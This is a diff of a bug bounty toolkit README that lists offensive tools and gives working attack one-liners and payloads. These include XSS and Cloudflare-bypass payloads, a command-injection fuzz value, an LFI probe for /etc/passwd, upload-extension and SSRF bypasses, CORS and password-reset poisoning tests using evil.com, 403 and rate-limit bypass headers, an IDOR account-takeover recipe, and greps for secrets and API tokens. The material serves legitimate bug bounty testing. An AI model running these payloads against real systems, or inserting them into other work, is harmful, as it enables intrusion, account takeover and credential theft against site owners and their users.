@@ -1,68 +1,62 @@
 # Bug Bounty Builder ¯\\_(ツ)_/¯
 
-
 <div align="center">
-    
+
 <img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat"/> <br/>
 
 <a href="https://github.com/0xJin/awesome-bugbounty-builder/network"><img alt="GitHub forks" src="https://img.shields.io/github/forks/0xJin/awesome-bugbounty-builder"></a>
 <a href="https://github.com/0xJin/awesome-bugbounty-builder/blob/main/LICENSE"><img alt="GitHub license" src="https://img.shields.io/github/license/0xJin/awesome-bugbounty-builder"></a>
 <a href="https://github.com/0xJin/awesome-bugbounty-builder/stargazers"><img alt="GitHub stars" src="https://img.shields.io/github/stars/0xJin/awesome-bugbounty-builder"></a>
 
-
 <p><i> Bug Bounty builder Project - ALL common Tools for find your Vulnerabilities.</i></p>
 </div>
 
-
-
 **Tested on Debian.**
 
-
 ![bb](https://user-images.githubusercontent.com/81621963/147457586-79ac41eb-f995-455b-a144-f80a5783047a.PNG)
-
 
 ---
 
 ## Installation:
 
 ```sh
-$ git clone https://github.com/0xJin/awesome-bugbounty-builder.git
-$ cd awesome-bugbounty-builder/
-$ chmod +x awesome-bugbounty-builder.sh
-$ ./awesome-bugbounty-builder.sh
+git clone https://github.com/0xJin/awesome-bugbounty-builder.git
+cd awesome-bugbounty-builder/
+chmod +x awesome-bugbounty-builder.sh
+./awesome-bugbounty-builder.sh
 ```
 
-## Tools You will find here 
+## Tools You will find here
 
-- Amass 
-- Sublister 
-- Gauplus 
+- Amass
+- Sublister
+- Gauplus
 - HTTPX
-- Gf + patterns 
-- Kxss 
-- Sqlmap 
-- Commix 
-- Tplmap 
-- HYDRA 
-- John the ripper 
-- Evilwinrm 
-- Arjun 
-- Paramspider 
-- NoSQLmap 
-- NMAP 
-- Nikto 
-- FFUF 
-- 403-Bypass 
-- Gobuster 
-- Seclists 
-- Hash-identifier 
-- XSSMAP 
-- Smuggler 
-- SSRFmap 
-- Gmapsapiscanner 
-- Qsreplace 
-- exiftool 
-- XSRFProbe 
+- Gf + patterns
+- Kxss
+- Sqlmap
+- Commix
+- Tplmap
+- HYDRA
+- John the ripper
+- Evilwinrm
+- Arjun
+- Paramspider
+- NoSQLmap
+- NMAP
+- Nikto
+- FFUF
+- 403-Bypass
+- Gobuster
+- Seclists
+- Hash-identifier
+- XSSMAP
+- Smuggler
+- SSRFmap
+- Gmapsapiscanner
+- Qsreplace
+- exiftool
+- XSRFProbe
 - XXE Exploiter
 - Rush
 - Rustscan
@@ -75,31 +69,27 @@ $ ./awesome-bugbounty-builder.sh
 
 ---
 
+## Bug Bounty TIPS and Usage of tools + One Liner TIPS :
 
- ## Bug Bounty TIPS and Usage of tools + One Liner TIPS :
-
-
-### ONE-LINER *RECON* for FUZZ XSS :
+### ONE-LINER _RECON_ for FUZZ XSS :
 
 ```sh
-$ amass enum -brute -passive -d example.com | httpx -silent -status-code | tee domain.txt
-$ cat domain.txt | gauplus -random-agent -t 200 | gf xss | kxss | tee domain2.txt
-$ cat domain.txt | gauplus -random-agent -t 200 | gf xss | uro | qsreplace '"><img src=x onerror=prompt('jin');>' | freq
+amass enum -brute -passive -d example.com | httpx -silent -status-code | tee domain.txt
+cat domain.txt | gauplus -random-agent -t 200 | gf xss | kxss | tee domain2.txt
+cat domain.txt | gauplus -random-agent -t 200 | gf xss | uro | qsreplace '"><img src=x onerror=prompt('jin');>' | freq
 ```
 
 ---
 
-
-### FUZZ all SUBDOMAINS with *FUFF* ONE-LINER :
+### FUZZ all SUBDOMAINS with _FUFF_ ONE-LINER :
 
 ```sh
-$ amass enum -brute -passive -d http://example.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w wordlist.txt -u @/FUZZ -mc 200'
+amass enum -brute -passive -d http://example.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w wordlist.txt -u @/FUZZ -mc 200'
 ```
 
 ---
 
-
-### COMMAND Injection with *FUFF* ONE-LINER :
+### COMMAND Injection with _FUFF_ ONE-LINER :
 
 ```sh
 $ cat subdomains.txt | httpx -silent -status-code | gauplus -random-agent -t 200 | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
@@ -108,9 +98,7 @@ $ ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
 // You can use the same query for search SSTI in qsreplase add "{{7*7}}" and search on burp for '49'
 ```
 
-
 ---
-
 
 ### SQL Injection Tips :
 
@@ -130,16 +118,13 @@ $ sqlmap -u "http://redacted.com" --dbs --batch --random-agent --forms --ignore-
 
 ---
 
-
 ### XSS + SQLi + CSTI/SSTI
 
 ```sh
 Payload: '"><svg/onload=prompt(5);>{{7*7}}
 ```
 
-
 ---
-
 
 ### EXIFTOOL + file UPLOAD Tips :
 
@@ -166,29 +151,23 @@ file.png.jpg.php
 file.php%00.png%00.jpg
 ```
 
-
 ---
-
 
 ### Open Redirect Tips ONE-LINER :
 
 ```sh
-$ export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
+export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
 ```
 
-
 ---
-
 
 ### LFI ONE-LINER :
 
 ```sh
-$ gauplus -random-agent -t 200 http://redacted.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+gauplus -random-agent -t 200 http://redacted.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 ```
 
-
 ---
-
 
 ### Best SSRF Bypass :
 
@@ -203,9 +182,7 @@ http://017700000001
 http://0177.00.00.01
 ```
 
-
 ---
-
 
 ### Email Attacks :
 
@@ -228,9 +205,7 @@ john.doe@abc123.burpcollaborator.net
 john.doe@[127.0.0.1]
 ```
 
-
 ---
-
 
 ### XSS Payload for Image
 
@@ -241,9 +216,7 @@ john.doe@[127.0.0.1]
 <<script>alert('xss')<!--a-->a.png
 ```
 
-
 ---
-
 
 ### My XSS for bypass CLOUDFLARE with default rules
 
@@ -251,19 +224,15 @@ john.doe@[127.0.0.1]
 "/><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
 ```
 
-
 ---
-
 
 ### Find hidden params in javascript files:
 
 ```sh
-$ amass enum -passive -brute -d redacted.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done
+amass enum -passive -brute -d redacted.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done
 ```
 
-
 ---
-
 
 ### IDOR to Account TakeOver quickly :
 
@@ -276,16 +245,13 @@ $ amass enum -passive -brute -d redacted.com | gau | egrep -v '(.css|.svg)' | wh
 ~Reload page
 ```
 
-
 ---
-
 
 ### For API-KEYS :
 
 ```sh
-$ use gauplus and paramspider , after you can grep words like "api" or "key" and use gmapsapiscanner for see if is vulnerable.
+use gauplus and paramspider , after you can grep words like "api" or "key" and use gmapsapiscanner for see if is vulnerable.
 ```
-
 
 ### Find sensitive information with GF tool :
 
@@ -295,9 +261,7 @@ sort -u domains.txt | fff -s 200 -o out/
 $ for i in `gf -list`; do [[ ${i} =~ "_secrets"* ]] && gf ${i}; done
 ```
 
-
 ---
-
 
 ### Bypass RATE-LIMIT by adding :
 
@@ -311,9 +275,7 @@ X-Host: IP
 X-Forwared-Host: IP
 ```
 
-
 ---
-
 
 ### Find Access Token with FFUF and GAUPLUS :
 
@@ -325,19 +287,15 @@ $ ffuf -mc 200 w jsurls.txt:HFUZZ -u HFUZZ -replay-proxy http://127.0.0.1:8080
 // Extract found tokens and validate with https://github.com/streaak/keyhacks
 ```
 
-
 ---
-
 
 ### Find CORS vulnerabilities :
 
 ```sh
-$ amass enum -d redacted.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin: evil.com" {} | [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n3[0;32m[VUL TO CORS] 3[0m{}"' 2>/dev/null
+amass enum -d redacted.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin: evil.com" {} | [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n3[0;32m[VUL TO CORS] 3[0m{}"' 2>/dev/null
 ```
 
-
 ---
-
 
 ### Bypass 403 and 401 :
 
@@ -347,9 +305,7 @@ X-Override-URL: /admin
 X-Rewrite-URL: /admin
 ```
 
-
 ---
-
 
 ### Password poisoning bypass to account takeover :
 
@@ -361,9 +317,7 @@ Host: evil.com
 // If you receive a link this works!
 ```
 
-
 ---
-
 
 ### Best Wordlists :
 
@@ -372,14 +326,14 @@ https://github.com/six2dez/OneListForAll/releases
 https://github.com/Karanxa/Bug-Bounty-Wordlists
 ```
 
-
 ---
 
-## Thanks 
+## Thanks
 
 **[`^        back to top        ^`](#)**
 
 ## License
+
 MIT License & [cc](https://creativecommons.org/licenses/by/4.0/) license
 
 <a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by/4.0/88x31.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.
